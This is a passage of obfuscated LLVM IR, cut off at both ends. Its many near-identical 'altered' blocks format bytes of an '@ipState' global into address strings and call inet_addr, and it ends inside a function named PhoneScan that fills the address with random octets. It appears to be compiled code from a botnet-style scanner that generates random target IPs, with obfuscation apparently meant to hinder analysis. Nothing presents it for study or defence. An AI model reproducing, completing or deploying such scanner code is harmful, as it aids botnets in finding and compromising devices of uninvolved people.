  %3290 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3291 = zext i8 %3290 to i32
  %3292 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3293 = zext i8 %3292 to i32
  %3294 = call i32 (i8*, i8*, ...) @szprintf(i8* %3289, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.90, i32 0, i32 0), i32 %3291, i32 %3293)
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1031
  %3295 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3296 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3297 = zext i8 %3296 to i32
  %3298 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3299 = zext i8 %3298 to i32
  %3300 = call i32 (i8*, i8*, ...) @szprintf(i8* %3295, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.91, i32 0, i32 0), i32 %3297, i32 %3299)
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1057
  %3301 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3302 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3303 = zext i8 %3302 to i32
  %3304 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3305 = zext i8 %3304 to i32
  %3306 = call i32 (i8*, i8*, ...) @szprintf(i8* %3301, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0), i32 %3303, i32 %3305)
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1093
  %3307 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3308 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3309 = zext i8 %3308 to i32
  %3310 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3311 = zext i8 %3310 to i32
  %3312 = call i32 (i8*, i8*, ...) @szprintf(i8* %3307, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.94, i32 0, i32 0), i32 %3309, i32 %3311)
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1119
  %3313 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3314 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3315 = zext i8 %3314 to i32
  %3316 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3317 = zext i8 %3316 to i32
  %3318 = call i32 (i8*, i8*, ...) @szprintf(i8* %3313, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.95, i32 0, i32 0), i32 %3315, i32 %3317)
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1152
  %3319 = load i32, i32* %1, align 4
  %3320 = icmp eq i32 %3319, 55
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1171
  %3321 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3322 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3323 = zext i8 %3322 to i32
  %3324 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3325 = zext i8 %3324 to i32
  %3326 = call i32 (i8*, i8*, ...) @szprintf(i8* %3321, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.97, i32 0, i32 0), i32 %3323, i32 %3325)
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1194
  %3327 = load i32, i32* %1, align 4
  %3328 = icmp eq i32 %3327, 56
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1223
  %3329 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3330 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3331 = zext i8 %3330 to i32
  %3332 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3333 = zext i8 %3332 to i32
  %3334 = call i32 (i8*, i8*, ...) @szprintf(i8* %3329, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.99, i32 0, i32 0), i32 %3331, i32 %3333)
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1246
  %3335 = load i32, i32* %1, align 4
  %3336 = icmp eq i32 %3335, 58
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1272
  %3337 = load i32, i32* %1, align 4
  %3338 = icmp eq i32 %3337, 59
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1298
  %3339 = load i32, i32* %1, align 4
  %3340 = icmp eq i32 %3339, 60
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1374
  %3341 = load i32, i32* %1, align 4
  %3342 = icmp eq i32 %3341, 66
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1400
  %3343 = load i32, i32* %1, align 4
  %3344 = icmp eq i32 %3343, 67
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1419
  %3345 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3346 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3347 = zext i8 %3346 to i32
  %3348 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3349 = zext i8 %3348 to i32
  %3350 = call i32 (i8*, i8*, ...) @szprintf(i8* %3345, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.109, i32 0, i32 0), i32 %3347, i32 %3349)
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1485
  %3351 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3352 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3353 = zext i8 %3352 to i32
  %3354 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3355 = zext i8 %3354 to i32
  %3356 = call i32 (i8*, i8*, ...) @szprintf(i8* %3351, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i32 %3353, i32 %3355)
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1508
  %3357 = load i32, i32* %1, align 4
  %3358 = icmp eq i32 %3357, 73
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1527
  %3359 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3360 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3361 = zext i8 %3360 to i32
  %3362 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3363 = zext i8 %3362 to i32
  %3364 = call i32 (i8*, i8*, ...) @szprintf(i8* %3359, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 %3361, i32 %3363)
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1553
  %3365 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3366 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3367 = zext i8 %3366 to i32
  %3368 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3369 = zext i8 %3368 to i32
  %3370 = call i32 (i8*, i8*, ...) @szprintf(i8* %3365, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.114, i32 0, i32 0), i32 %3367, i32 %3369)
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1586
  %3371 = load i32, i32* %1, align 4
  %3372 = icmp eq i32 %3371, 76
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1612
  %3373 = load i32, i32* %1, align 4
  %3374 = icmp eq i32 %3373, 77
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1631
  %3375 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3376 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3377 = zext i8 %3376 to i32
  %3378 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3379 = zext i8 %3378 to i32
  %3380 = call i32 (i8*, i8*, ...) @szprintf(i8* %3375, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.117, i32 0, i32 0), i32 %3377, i32 %3379)
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1654
  %3381 = load i32, i32* %1, align 4
  %3382 = icmp eq i32 %3381, 78
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1673
  %3383 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3384 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3385 = zext i8 %3384 to i32
  %3386 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3387 = zext i8 %3386 to i32
  %3388 = call i32 (i8*, i8*, ...) @szprintf(i8* %3383, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0), i32 %3385, i32 %3387)
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1716
  %3389 = load i32, i32* %1, align 4
  %3390 = icmp eq i32 %3389, 81
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1742
  %3391 = load i32, i32* %1, align 4
  %3392 = icmp eq i32 %3391, 82
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1761
  %3393 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3394 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3395 = zext i8 %3394 to i32
  %3396 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3397 = zext i8 %3396 to i32
  %3398 = call i32 (i8*, i8*, ...) @szprintf(i8* %3393, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.122, i32 0, i32 0), i32 %3395, i32 %3397)
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1817
  %3399 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3400 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3401 = zext i8 %3400 to i32
  %3402 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3403 = zext i8 %3402 to i32
  %3404 = call i32 (i8*, i8*, ...) @szprintf(i8* %3399, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.126, i32 0, i32 0), i32 %3401, i32 %3403)
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1853
  %3405 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3406 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3407 = zext i8 %3406 to i32
  %3408 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3409 = zext i8 %3408 to i32
  %3410 = call i32 (i8*, i8*, ...) @szprintf(i8* %3405, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.128, i32 0, i32 0), i32 %3407, i32 %3409)
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1916
  %3411 = load i32, i32* %1, align 4
  %3412 = icmp eq i32 %3411, 93
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1935
  %3413 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3414 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3415 = zext i8 %3414 to i32
  %3416 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3417 = zext i8 %3416 to i32
  %3418 = call i32 (i8*, i8*, ...) @szprintf(i8* %3413, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.121, i32 0, i32 0), i32 %3415, i32 %3417)
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1958
  %3419 = load i32, i32* %1, align 4
  %3420 = icmp eq i32 %3419, 94
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1977
  %3421 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3422 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3423 = zext i8 %3422 to i32
  %3424 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3425 = zext i8 %3424 to i32
  %3426 = call i32 (i8*, i8*, ...) @szprintf(i8* %3421, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.133, i32 0, i32 0), i32 %3423, i32 %3425)
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %2030
  %3427 = load i32, i32* %1, align 4
  %3428 = icmp eq i32 %3427, 98
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %2076
  %3429 = load i32, i32* %1, align 4
  %3430 = icmp eq i32 %3429, 101
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %2122
  %3431 = load i32, i32* %1, align 4
  %3432 = icmp eq i32 %3431, 104
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %2141
  %3433 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3434 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3435 = zext i8 %3434 to i32
  %3436 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3437 = zext i8 %3436 to i32
  %3438 = call i32 (i8*, i8*, ...) @szprintf(i8* %3433, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i32 %3435, i32 %3437)
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %2167
  %3439 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3440 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3441 = zext i8 %3440 to i32
  %3442 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3443 = zext i8 %3442 to i32
  %3444 = call i32 (i8*, i8*, ...) @szprintf(i8* %3439, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.143, i32 0, i32 0), i32 %3441, i32 %3443)
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %2193
  %3445 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3446 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3447 = zext i8 %3446 to i32
  %3448 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3449 = zext i8 %3448 to i32
  %3450 = call i32 (i8*, i8*, ...) @szprintf(i8* %3445, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.144, i32 0, i32 0), i32 %3447, i32 %3449)
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2216
  %3451 = load i32, i32* %1, align 4
  %3452 = icmp eq i32 %3451, 107
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2252
  %3453 = load i32, i32* %1, align 4
  %3454 = icmp eq i32 %3453, 109
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2288
  %3455 = load i32, i32* %1, align 4
  %3456 = icmp eq i32 %3455, 111
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2314
  %3457 = load i32, i32* %1, align 4
  %3458 = icmp eq i32 %3457, 112
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %2343
  %3459 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3460 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3461 = zext i8 %3460 to i32
  %3462 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3463 = zext i8 %3462 to i32
  %3464 = call i32 (i8*, i8*, ...) @szprintf(i8* %3459, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.150, i32 0, i32 0), i32 %3461, i32 %3463)
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %2389
  %3465 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3466 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3467 = zext i8 %3466 to i32
  %3468 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3469 = zext i8 %3468 to i32
  %3470 = call i32 (i8*, i8*, ...) @szprintf(i8* %3465, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.153, i32 0, i32 0), i32 %3467, i32 %3469)
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %2412
  %3471 = load i32, i32* %1, align 4
  %3472 = icmp eq i32 %3471, 117
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %2438
  %3473 = load i32, i32* %1, align 4
  %3474 = icmp eq i32 %3473, 118
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2457
  %3475 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3476 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3477 = zext i8 %3476 to i32
  %3478 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3479 = zext i8 %3478 to i32
  %3480 = call i32 (i8*, i8*, ...) @szprintf(i8* %3475, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i32 %3477, i32 %3479)
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %2480
  %3481 = load i32, i32* %1, align 4
  %3482 = icmp eq i32 %3481, 119
  br label %originalBB314

originalBB318alteredBB:                           ; preds = %originalBB318, %2499
  %3483 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3484 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3485 = zext i8 %3484 to i32
  %3486 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3487 = zext i8 %3486 to i32
  %3488 = call i32 (i8*, i8*, ...) @szprintf(i8* %3483, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i32 %3485, i32 %3487)
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2525
  %3489 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3490 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3491 = zext i8 %3490 to i32
  %3492 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3493 = zext i8 %3492 to i32
  %3494 = call i32 (i8*, i8*, ...) @szprintf(i8* %3489, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.157, i32 0, i32 0), i32 %3491, i32 %3493)
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %2551
  %3495 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3496 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3497 = zext i8 %3496 to i32
  %3498 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3499 = zext i8 %3498 to i32
  %3500 = call i32 (i8*, i8*, ...) @szprintf(i8* %3495, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i32 %3497, i32 %3499)
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %2574
  %3501 = load i32, i32* %1, align 4
  %3502 = icmp eq i32 %3501, 122
  br label %originalBB330

originalBB334alteredBB:                           ; preds = %originalBB334, %2593
  %3503 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3504 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3505 = zext i8 %3504 to i32
  %3506 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3507 = zext i8 %3506 to i32
  %3508 = call i32 (i8*, i8*, ...) @szprintf(i8* %3503, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.159, i32 0, i32 0), i32 %3505, i32 %3507)
  br label %originalBB334

originalBB338alteredBB:                           ; preds = %originalBB338, %2629
  %3509 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3510 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3511 = zext i8 %3510 to i32
  %3512 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3513 = zext i8 %3512 to i32
  %3514 = call i32 (i8*, i8*, ...) @szprintf(i8* %3509, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.161, i32 0, i32 0), i32 %3511, i32 %3513)
  br label %originalBB338

originalBB342alteredBB:                           ; preds = %originalBB342, %2665
  %3515 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3516 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3517 = zext i8 %3516 to i32
  %3518 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3519 = zext i8 %3518 to i32
  %3520 = call i32 (i8*, i8*, ...) @szprintf(i8* %3515, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.163, i32 0, i32 0), i32 %3517, i32 %3519)
  br label %originalBB342

originalBB346alteredBB:                           ; preds = %originalBB346, %2698
  %3521 = load i32, i32* %1, align 4
  %3522 = icmp eq i32 %3521, 128
  br label %originalBB346

originalBB350alteredBB:                           ; preds = %originalBB350, %2747
  %3523 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3524 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3525 = zext i8 %3524 to i32
  %3526 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3527 = zext i8 %3526 to i32
  %3528 = call i32 (i8*, i8*, ...) @szprintf(i8* %3523, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.166, i32 0, i32 0), i32 %3525, i32 %3527)
  br label %originalBB350

originalBB354alteredBB:                           ; preds = %originalBB354, %2773
  %3529 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3530 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3531 = zext i8 %3530 to i32
  %3532 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3533 = zext i8 %3532 to i32
  %3534 = call i32 (i8*, i8*, ...) @szprintf(i8* %3529, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.167, i32 0, i32 0), i32 %3531, i32 %3533)
  br label %originalBB354

originalBB358alteredBB:                           ; preds = %originalBB358, %2816
  %3535 = load i32, i32* %1, align 4
  %3536 = icmp eq i32 %3535, 135
  br label %originalBB358

originalBB362alteredBB:                           ; preds = %originalBB362, %2845
  %3537 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3538 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3539 = zext i8 %3538 to i32
  %3540 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3541 = zext i8 %3540 to i32
  %3542 = call i32 (i8*, i8*, ...) @szprintf(i8* %3537, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.171, i32 0, i32 0), i32 %3539, i32 %3541)
  br label %originalBB362

originalBB366alteredBB:                           ; preds = %originalBB366, %2881
  %3543 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3544 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3545 = zext i8 %3544 to i32
  %3546 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3547 = zext i8 %3546 to i32
  %3548 = call i32 (i8*, i8*, ...) @szprintf(i8* %3543, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.173, i32 0, i32 0), i32 %3545, i32 %3547)
  br label %originalBB366

originalBB370alteredBB:                           ; preds = %originalBB370, %2937
  %3549 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3550 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3551 = zext i8 %3550 to i32
  %3552 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3553 = zext i8 %3552 to i32
  %3554 = call i32 (i8*, i8*, ...) @szprintf(i8* %3549, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.177, i32 0, i32 0), i32 %3551, i32 %3553)
  br label %originalBB370

originalBB374alteredBB:                           ; preds = %originalBB374, %2960
  %3555 = load i32, i32* %1, align 4
  %3556 = icmp eq i32 %3555, 143
  br label %originalBB374

originalBB378alteredBB:                           ; preds = %originalBB378, %2986
  %3557 = load i32, i32* %1, align 4
  %3558 = icmp eq i32 %3557, 144
  br label %originalBB378

originalBB382alteredBB:                           ; preds = %originalBB382, %3025
  %3559 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3560 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3561 = zext i8 %3560 to i32
  %3562 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3563 = zext i8 %3562 to i32
  %3564 = call i32 (i8*, i8*, ...) @szprintf(i8* %3559, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.181, i32 0, i32 0), i32 %3561, i32 %3563)
  br label %originalBB382

originalBB386alteredBB:                           ; preds = %originalBB386, %3048
  %3565 = load i32, i32* %1, align 4
  %3566 = icmp eq i32 %3565, 147
  br label %originalBB386

originalBB390alteredBB:                           ; preds = %originalBB390, %3084
  %3567 = load i32, i32* %1, align 4
  %3568 = icmp eq i32 %3567, 149
  br label %originalBB390

originalBB394alteredBB:                           ; preds = %originalBB394, %3140
  %3569 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3570 = call i32 @inet_addr(i8* %3569) #5
  br label %originalBB394
}

; Function Attrs: noinline nounwind uwtable
define i32 @PhoneScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
